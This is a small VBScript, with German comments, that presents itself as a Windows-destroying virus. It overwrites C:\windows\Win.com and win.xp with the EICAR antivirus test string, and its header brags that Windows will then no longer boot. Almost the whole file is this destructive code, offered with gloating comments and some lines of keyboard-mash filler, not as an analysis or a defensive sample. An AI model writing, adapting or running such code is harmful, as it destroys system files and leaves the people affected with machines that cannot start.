REM  WIN.COM/WIN.XP ZERSTÖRER 1.0
REM  HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAH
REM  DIESER VIRUS ZERSTÖRT DIE WIN.COM bzw Win.xp, indem er sie in einen Virus ändert, beim nächst booten
REM wird Windows nicht mehr gebootet, weil die Win.com bzw Win.xp nicht mehr in der form existiert,
REM falls der Virenscanner nicht schon zuerst die Win.com gelöscht hat!
set shell = CreateObject("Shell.Application")
set fs = CreateObject("Scripting.FileSystemObject")
set WSHShell = CreateObject("Wscript.Shell")
 
ordnername = "C:\"
   if not fs.FolderExists(ordnername) then  
             MsgBox "Der Ordner : '" + ordnername + "' konnte nicht gefunden werden !", vbExclamation
             WScript.Quit
   end if
set ordner = shell.NameSpace(ordnername)
for k = 1 to 2
IF k = 1 THEN ausgabedatei = "C:\windows\Win.com"
IF k <> 1 THEN ausgabedatei = "C:\windows\win.xp"
set ausgabe = fs.CreateTextFile(ausgabedatei, vbTrue)
Rem jjoasdöoifmsdiopmfcnlaösdfüäöasdlm,fpsdmfpkasdmföksdmäfösdmafsdÄFÖSDJMFsdifjsdfkapof
    Print "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*", 78
Rem jksdoknoasdinfpbodsanmfodsnpafvjosdiamfviosdanmfopasdjpkofjbpsdkoamüpönfsda,fäönasf
next 
sub Print(was, laenge)
   if laenge>0 then
   was = left(was, laenge)
   if len(was) < laenge then
   was = was + space(laenge - len (was))
   end if
   end if
   ausgabe.Write was
end sub
 



